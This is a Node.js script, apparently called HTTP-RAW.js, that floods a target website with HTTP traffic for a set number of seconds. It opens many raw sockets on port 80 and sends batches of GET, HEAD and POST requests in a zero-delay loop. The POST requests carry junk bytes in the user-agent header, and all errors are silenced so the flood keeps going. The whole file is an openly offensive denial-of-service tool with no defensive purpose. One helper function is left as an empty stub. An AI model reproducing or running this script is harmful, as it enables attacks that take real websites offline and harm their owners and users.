const fs = require('fs');
const url = require('url');
const net = require('net');

if (process.argv.length <= 2) {
    console.log("node HTTP-RAW.js url time");
    process.exit(-1);
}

var target = process.argv[2];
var parsed = url.parse(target);
var host = url.parse(target).host;
var time = process.argv[3];

process.on('uncaughtException', function (e) {});
process.on('unhandledRejection', function (e) {});

function getRandomUserAgent() {
    // Your existing function
}

const nullHexs = [
    "\x00",
    "\xFF",
    "\xC2",
    "\xA0"
];

function makeRequest(requestType, userAgent) {
    return new Promise((resolve) => {
        var s = require('net').Socket();
        s.connect(80, host);
        s.setTimeout(10000);

        s.write(`${requestType} ${target} HTTP/1.1\r\nHost: ${parsed.host}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ${userAgent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n`);

        s.on('data', function () {
            setTimeout(function () {
                s.destroy();
                resolve();
            }, 5000);
        });
    });
}

async function runRequests() {
    const requests = [];

    for (let i = 0; i < 50; i++) {
        const requestType = i % 3 === 0 ? 'GET' : (i % 3 === 1 ? 'HEAD' : 'POST');
        const userAgent = requestType === 'POST' ? nullHexs[Math.floor(Math.random() * nullHexs.length)] : getRandomUserAgent();

        requests.push(makeRequest(requestType, userAgent));
    }

    await Promise.all(requests);
}

var int = setInterval(() => {
    runRequests();
}, 0);

setTimeout(() => clearInterval(int), time * 1000);